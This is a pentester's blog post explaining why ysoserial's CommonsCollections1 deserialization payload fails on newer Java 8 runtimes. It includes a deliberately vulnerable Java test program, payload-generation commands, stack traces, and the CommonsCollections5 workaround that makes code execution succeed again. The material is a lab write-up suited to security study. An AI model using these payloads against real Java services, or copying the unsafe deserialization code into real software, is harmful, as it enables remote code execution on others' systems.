---
layout: post
title: CommonCollections deserialization attack payloads from ysoserial failing on
  > JRE 8u72
date: '2016-05-01T15:27:00.000+10:00'
author: Stephen Bradshaw
tags:
- ysoserial
- deserialization
- pentesting
- java
modified_time: '2016-05-01T15:31:35.133+10:00'
blogger_id: tag:blogger.com,1999:blog-2318886372568084567.post-8023372567943890712
blogger_orig_url: http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html
redirect_from: /2016/05/commoncollections-deserialization.html
---

Recently, while trying to exploit a Java app vulnerable to a <a href="https://www.owasp.org/index.php/Deserialization_of_untrusted_data">deserialisation attack</a>, I was having some issues getting the CommonsCollections1 payload from <a href="https://github.com/frohoff/ysoserial">ysoerial</a> working.  In case you're not familiar with this, essentially the <a href="https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread">&lt;=3.2.1 versions of the Apache Commons Collections library</a> can be used to create an attack payload of Java serialized data that can be used to execute local commands on systems running Java applications that deserialize untrusted attacker supplied content. The ysoserial tool enables an attacker to create a number of different serialized Java attack payloads which make use of a wide variety of commonly used Java libraries in order to fulfill their goals. The CommonsCollection1 payload is one of those targeting the CommonsCollections 3 branch.<br/><br/>This was a little frustrating, because I had used this exact payload multiple times in the past on pentests with great success.  Some further investigation was required, to figure out what was happening here.<br/><br/>During some testing on my local system, using a very simple vulnerable test application, I found that the payloads did not seem to work when run against Java apps executed on Oracle Java 1.8u91 but worked fine on Oracle Java 1.7u80. <br/><br/>Here's the vulnerable Java code, "SerializeTest.java", I was using for testing, which takes a single input parameter of a filename, then reads the contents of that file and tries to deserialise it. The code makes reference to the Java Commons Collection library, which will provide the ability for us to use the appropriate versions of the Commons Collection payloads from ysoserial to exploit this application, as long as the matching vulnerable version of the Commons Collections library is on the applications class path when we run it. <br/><br/><pre class="prettyprint">import java.io.ObjectInputStream;<br/>import java.io.ByteArrayInputStream;<br/>import java.nio.file.Files;<br/>import java.nio.file.Path;<br/>import java.nio.file.Paths;<br/>import java.io.InputStream;<br/>import org.apache.commons.collections.*;<br/> <br/>public class SerializeTest{<br/>  public static void main(String args[]) throws Exception{<br/>    Bag bag = new HashBag();<br/>    Path path = Paths.get(args[0]);<br/>    byte[] data = Files.readAllBytes(path);<br/>    InputStream d = new ByteArrayInputStream(data);<br/>    ObjectInputStream ois = new ObjectInputStream(d);<br/>    ois.readObject();<br/>  }<br/>}<br/></pre><br/><br/>I have included the command output showing the result of my testing below. During the testing, I create a file with malicious serialised Java data at /tmp/CommonsCollections1.bin with ysoserial, then try and read it with my vulnerable Java app using different versions of the Java runtime.<br/><br/>The following command creates a CommonsCollection1 payload file. This payload should create the file /tmp/pwned if deserialised by a Java application that has a vulnerable version of the Apache Commons Collections 3.x library on the class path.<br/><br/><pre class="code">stephen@ubuntu:~/workspace/SerializeTest/bin$ java -jar ~/Downloads/ysoserial-0.0.4-all.jar CommonsCollections1 'touch /tmp/pwned' &gt; /tmp/CommonsCollections1.bin<br/></pre><br/><br/>Now, we try and read that payload file using our vulnerable Java application, via running it with the default Java JRE on my machine, which happens to be Java 1.8.0_91.  The expectation is that this will work, and run our payload, creating file /tmp/pwned. When running the application, I have set the class path to point to a copy of the Commons Collections 3.2 library.<br/><br/><pre class="code">stephen@ubuntu:~/workspace/SerializeTest/bin$ java -version<br/>java version "1.8.0_91"<br/>Java(TM) SE Runtime Environment (build 1.8.0_91-b14)<br/>Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode)<br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ java -cp .:../lib/commons-collections-3.2.jar SerializeTest /tmp/CommonsCollections1.bin <br/>Exception in thread "main" java.lang.annotation.IncompleteAnnotationException: java.lang.Override missing element entrySet<br/> at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:81)<br/> at com.sun.proxy.$Proxy0.entrySet(Unknown Source)<br/> at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:452)<br/> at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)<br/> at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)<br/> at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/> at java.lang.reflect.Method.invoke(Method.java:498)<br/> at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1058)<br/> at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1909)<br/> at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1808)<br/> at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1353)<br/> at java.io.ObjectInputStream.readObject(ObjectInputStream.java:373)<br/> at SerializeTest.main(SerializeTest.java:17)<br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ ls /tmp/pwned<br/>ls: cannot access '/tmp/pwned': No such file or directory<br/></pre><br/><br/>The file /tmp/pwned doesn't exist.  Strange.  Lets try running the vulnerable application using an older version of Java. <br/><br/><pre class="code">stephen@ubuntu:~/workspace/SerializeTest/bin$ /usr/lib/jvm/java-7-oracle/bin/java -version<br/>java version "1.7.0_80"<br/>Java(TM) SE Runtime Environment (build 1.7.0_80-b15)<br/>Java HotSpot(TM) 64-Bit Server VM (build 24.80-b11, mixed mode)<br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ /usr/lib/jvm/java-7-oracle/bin/java -cp .:../lib/commons-collections-3.2.jar SerializeTest /tmp/CommonsCollections1.bin <br/>Exception in thread "main" java.lang.ClassCastException: java.lang.Integer cannot be cast to java.util.Set<br/> at com.sun.proxy.$Proxy0.entrySet(Unknown Source)<br/> at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:443)<br/> at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)<br/> at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)<br/> at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/> at java.lang.reflect.Method.invoke(Method.java:606)<br/> at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)<br/> at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)<br/> at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)<br/> at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)<br/> at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)<br/> at SerializeTest.main(SerializeTest.java:17)<br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ ls /tmp/pwned<br/>/tmp/pwned<br/></pre><br/><br/>OK, that worked - /tmp/pwned exists, proof of pwnage.  Same Java application, same malicious serialized payload, same vulnerable version of Commons Collections library - the only thing different between these two exploitation attempts is the version of the JRE being used to run the vulnerable app.  Note the different Java error messages produced via the two executions of that program.  The second error is an expected error, the first however is not. Some Googling for the "java.lang.Override missing element" Java "bad" error I was receiving led me to <a href="https://github.com/frohoff/ysoserial/issues/17">this issue</a> on the ysoserial tracker on GitHub (and yes, I probably should have just checked there before the hours of testing). <br/><br/>So, some changes made to the VM in December last year, in JRE 8u72 just after the Java deserialisation attack blew up in the security community with the <a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">Floxglove security post</a>, appear to be breaking this gadget chain. Is there a way around this so we can get our sploit on?  As it turns out, the answer is yes. <a href="https://github.com/frohoff/ysoserial/pull/26">A workaround</a> has been added to the ysoserial 0.0.5 snapshot branch on github.<br/><br/>Grab the latest snapshot of ysoserial via git, and build it using Maven like so.<br/><br/><pre class="code">mvn -DskipTests clean package<br/></pre><br/><br/>This will create a 0.0.5 snapshot version of ysoserial. Then, build an exploit using the CommonCollections5 payload.<br/><br/><pre class="code">stephen@ubuntu:~/workspace/SerializeTest/bin$ java -jar ~/Downloads/ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections5 'touch /tmp/pwned2.0' &gt; /tmp/CommonsCollections5.bin <br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ java -cp .:../lib/commons-collections-3.2.jar SerializeTest /tmp/CommonsCollections5.bin <br/>stephen@ubuntu:~/workspace/SerializeTest/bin$ ls /tmp/pwned2.0 <br/>/tmp/pwned2.0<br/></pre>